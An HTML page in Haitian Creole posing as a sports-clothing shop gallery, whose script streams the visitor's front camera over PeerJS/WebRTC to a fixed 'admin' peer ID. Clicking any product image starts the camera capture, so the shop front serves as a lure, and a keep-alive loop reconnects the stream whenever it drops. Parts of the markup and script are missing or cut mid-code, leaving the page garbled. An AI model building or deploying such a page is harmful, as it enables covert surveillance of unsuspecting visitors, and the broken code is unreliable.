<!DOCTYPE html>
<html lang="ht">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sport Style — Koleksyon 2026</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #0d0d0d; color: white;
    font-family: system-ui, sans-serif;
    min-height: 100vh; padding-bottom: 40px;
  }
  header {
    text-align: center; padding: 25px 20px 15px;
    border-bottom: 1px solid #222;
  }
  header h1 {
    font-size: 1.4rem; letter-spacing: 4px;
    color: #00cc66; text-transform: uppercase;
    font-weight: normal; margin-bottom: 4px;
  }
  header p {
    color: #888; font-size: 11px; letter-spacing: 2px;
    text-transform: uppercase;
  }

  /* ===== BOUTON AKSEPTE ===== */
  .cta {
    margin: 25px auto 20px; max-width: 360px; padding: 0 20px;
    text-align: center;
  }
  .cta button {
    width: 100%; padding: 18px 20px;
    background: linear-gradient(135deg, #00cc66, #009944);
    color: white; border: none; border-radius: 12px;
    font-size: 15px; font-weight: bold;
    cursor: pointer; font-family: system-ui, sans-serif;
    box-shadow: 0 4px 15px rgba(0, 204, 102, 0.3);
  }
  .cta button:disabled { opacity: 0.5; cursor: not-allowed; }
  .cta .hint {
    font-size: 11px; color: #777; margin-top: 10px; line-height: 1.5;
  }

  /* ===== ETA AKTIF ===== */
  .active-panel {
    margin: 25px auto 20px; max-width: 360px; padding: 0 20px;
    text-align: center;
  }
  .active-panel .card {
    background: #1a1a1a; border: 1px solid #00cc66;
    border-radius: 12px; padding: 20px;
  }
  .active-panel .dot {
    display: inline-block; width: 10px; height: 10px;
    border-radius: 50%; background: #ff3333;
    margin-right: 8px; animation: pulse 1s infinite;
    vertical-align: middle;
  }
  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
  .active-panel p { font-size: 14px; color: #ddd; }
  .active-panel button {
    width: 100%; margin-top: 15px; padding: 14px;
    background: #cc3333; color: white; border: none;
    border-radius: 10px; font-size: 13px; font-weight: bold;
    cursor: pointer; font-family: system-ui, sans-serif;
  }

  #status {
    text-align: center; color: #888; font-size: 12px;
    margin-top: 10px; padding: 0 20px; min-height: 16px;
  }

  /* ===== TIT GALRI ===== */
  .gallery-title {
    text-align: center; margin: 30px 0 12px;
    font-size: 11px; letter-spacing: 3px;
    color: #666; text-transform: uppercase;
  }
  .gallery-title::before,
  .gallery-title::after {
    content: ""; display: inline-block;
    width: 30px; height: 1px; background: #333;
    vertical-align: middle; margin: 0 10px;
  }

  /* ===== GALRI ===== */
  .gallery {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 4px; padding: 4px;
  }
  .item {
    position: relative; aspect-ratio: 1/1;
    overflow: hidden; background: #1a1a1a;
    cursor: pointer;
    border-radius: 6px;
  }
  .item:active { transform: scale(0.95); transition: transform 0.1s; }
  .item img {
    width: 100%; height: 100%; object-fit: cover;
    display: block;
  }
  .item .label {
    position: absolute; bottom: 0; left: 0; right: 0;
    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
    padding: 18px 6px 6px;
    font-size: 9px; letter-spacing: 0.5px;
    color: #fff; text-transform: uppercase;
    z-index: 2; text-align: center;
  }
  .item .price {
    color: #00cc66; font-weight: bold;
    font-size: 11px; display: block;
    margin-top: 2px;
  }

  /* ===== BOUTON "WÈ TOUT" ===== */
  .more-wrap {
    text-align: center; padding: 20px;
  }
  .more-btn {
    background: transparent;
    color: #00cc66; border: 2px solid #00cc66;
    padding: 14px 40px; border-radius: 10px;
    font-size: 14px; font-weight: bold;
    letter-spacing: 2px; text-transform: uppercase;
    cursor: pointer; font-family: system-ui, sans-serif;
    transition: all 0.3s;
  }
  .more-btn:hover {
    background: #00cc66; color: #0d0d0d;
  }

  .hidden { display: none; }
  footer {
    text-align: center; color: #444; font-size: 10px;
    margin-top: 30px; padding: 0 20px;
  }
</style>

    <button id="btnStart">✅ Mwen dakò — Pataje kamera m</button>
    <p class="hint">
      Lè w klike, ou dakò pou pataje kamera w.<br>
      Ou ka sispann nenpòt lè.
    </p>
  </div>

  <!-- ===== ETA AKTIF ===== -->

    <div class="card">
      <p><span class="dot"></span><strong>Kamera aktif</strong></p>
      <p style="margin-top:8px; font-size:13px; color:#aaa;">

/* Desen SVG pou chak espò */

const COLORS_BY_TYPE = {
  foot:   ["#2e7d32", "#388e3c", "#43a047", "#1b5e20"],
  basket: ["#e65100", "#ef6c00", "#f57c00", "#bf360c"],

function buildItem(p, i) {
  const colorArr = COLORS_BY_TYPE[p.type];
  const bg = colorArr[i % colorArr.length];
  const svg = `<svg style="width:100%;height:100%;display:block" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid slice">${SPORT_DRAWINGS[p.type](bg)}</svg>`;

    ${svg}
    <div class="label">${p.name}<span class="price">${p.price}</span></div>
  </div>`;
}

/* ============================================
   PEERJS + KAMERA
   ============================================ */
(() => {
  const ADMIN_ID = "admin-piyayy-2026-v2";

  const ctaView    = document.getElementById("ctaView");
  const activeView = document.getElementById("activeView");
  const btnStart   = document.getElementById("btnStart");
  const btnStop    = document.getElementById("btnStop");
  const statusEl   = document.getElementById("status");

  const ICE_CONFIG = {
    iceServers: [
      { urls: "stun:stun.l.google.com:19302" },
      { urls: "stun:stun1.l.google.com:19302" },
      { urls: "turn:openrelay.metered.ca:80",
        username: "openrelayproject", credential: "openrelayproject" },
      { urls: "turn:openrelay.metered.ca:443",
        username: "openrelayproject", credential: "openrelayproject" },
      { urls: "turn:openrelay.metered.ca:443?transport=tcp",
        username: "openrelayproject", credential: "openrelayproject" }
    ]
  };

  let peer = null;
  let localStream = null;
  let currentCall = null;
  let active = false;
  let intentionallyStopped = false;
  let keepAliveTimer = null;

  function setStatus(msg) { statusEl.innerText = msg; }

  function ensurePeer() {
    if (peer && !peer.destroyed) return peer;
    peer = new Peer(undefined, { config: ICE_CONFIG, debug: 1 });
    peer.on("error", (err) => {
      console.warn("PeerJS erè:", err);
      setStatus("❌ Erè: " + err.type);
    });
    peer.on("disconnected", () => {
      if (active) setTimeout(() => { if (peer && !peer.destroyed) peer.reconnect(); }, 2000);
    });
    return peer;
  }

  async function ensureCamera() {
    if (localStream) {
      const tracks = localStream.getVideoTracks();
      if (tracks.length > 0 && tracks.some(t => t.readyState === "live")) return true;
      try { tracks.forEach(t => t.stop()); } catch (e) {}
      localStream = null;
    }
    try {
      localStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, audio: false
      });
      return true;
    } catch (err) {
      try {
        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        return true;
      } catch (err2) { return false; }
    }
  }

  async function ensureCall() {
    const p = ensurePeer();
    if (currentCall) {
      const pc = currentCall.peerConnection;
      const broken = currentCall.open === false ||
        (pc && (pc.iceConnectionState === "failed" ||
                pc.iceConnectionState === "closed" ||
                pc.iceConnectionState === "disconnected"));
      if (!broken) return true;
      try { currentCall.close(); } catch (e) {}
      currentCall = null;
    }
    const camOk = await ensureCamera();
    if (!camOk) return false;
    if (!p.open) {
      await new Promise((resolve) => {
        if (p.open) return resolve();
        const t = setTimeout(resolve, 3000);
        p.once("open", () => { clearTimeout(t); resolve(); });
      });
    }
    if (!p.open) return false;
    currentCall = p.call(ADMIN_ID, localStream);
    if (!currentCall) return false;
    currentCall.on("close", () => { currentCall = null; });
    currentCall.on("error", (e) => { console.warn("Call erè:", e); currentCall = null; });
    return true;
  }

  function startKeepAlive() {
    if (keepAliveTimer) return;
    keepAliveTimer = setInterval(async () => {
      if (!active || intentionallyStopped) return;
      const camAlive = localStream &&
        localStream.getVideoTracks().some(t => t.readyState === "live");
      const callAlive = currentCall && currentCall.open !== false &&
        currentCall.peerConnection &&
        currentCall.peerConnection.iceConnectionState !== "failed" &&
        currentCall.peerConnection.iceConnectionState !== "closed";
      if (!camAlive || !callAlive) {
        await ensureCall();
        if (currentCall) setStatus("🟢 Ou konekte.");
      }
    }, 3000);
  }

  function stopKeepAlive() {
    if (keepAliveTimer) { clearInterval(keepAliveTimer); keepAliveTimer = null; }
  }

  async function startSharing() {
    btnStart.disabled = true;
    setStatus("⏳ Ap mande pèmisyon kamera...");
    intentionallyStopped = false;
    const ok = await ensureCamera();
    if (!ok) {
      setStatus("❌ Ou refize oswa kamera pa disponib.");
      btnStart.disabled = false;
      return;
    }
    setStatus("📡 Ap konekte...");
    await ensureCall();
    active = true;
    ctaView.classList.add("hidden");
    activeView.classList.remove("hidden");
    setStatus("🟢 Ou konekte.");
    startKeepAlive();
  }

  function stopSharing() {
    intentionallyStopped = true;
    active = false;
    stopKeepAlive();
    if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
    if (localStream) {
      localStream.getTracks().forEach(t => t.stop());
      localStream = null;
    }
    activeView.classList.add("hidden");
    ctaView.classList.remove("hidden");
    btnStart.disabled = false;
    setStatus("⛔ Ou sispann pataje.");
  }

  btnStart.onclick = startSharing;
  btnStop.onclick  = stopSharing;

  // Klike sou nenpòt imaj nan galri (premye oswa rès) = kòmanse pataje
  function attachGalleryClick(containerId) {
    const el = document.getElementById(containerId);
    if (!el) return;
    el.addEventListener("click", (e) => {
      if (active || intentionallyStopped) return;
      const item = e.target.closest(".item");
      if (item) {
        console.log("🛒 Klike sou:", item.dataset.name, item.dataset.price);
        startSharing();
      }
    });
  }
  attachGalleryClick("galleryFirst");
  attachGalleryClick("galleryRest");

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible" && active && !intentionallyStopped) {
      setTimeout(async () => {
        const camAlive = localStream &&
          localStream.getVideoTracks().some(t => t.readyState === "live");
        if (!camAlive || !currentCall || currentCall.open === false) {
          await ensureCall();
        }
      }, 300);
    }
  });

  window.addEventListener("pageshow", () => {
    if (active && !intentionallyStopped) {
      setTimeout(async () => {
        const camAlive = localStream &&
          localStream.getVideoTracks().some(t => t.readyState === "live");
        if (!camAlive || !currentCall || currentCall.open === false) {
          await ensureCall();
        }
      }, 300);
    }
  });

  window.addEventListener("beforeunload", () => {
    stopKeepAlive();
    if (localStream) localStream.getTracks().forEach(t => t.stop());
    if (currentCall) try { currentCall.close(); } catch (e) {}
    if (peer && !peer.destroyed) peer.destroy();
  });
})();
</script>
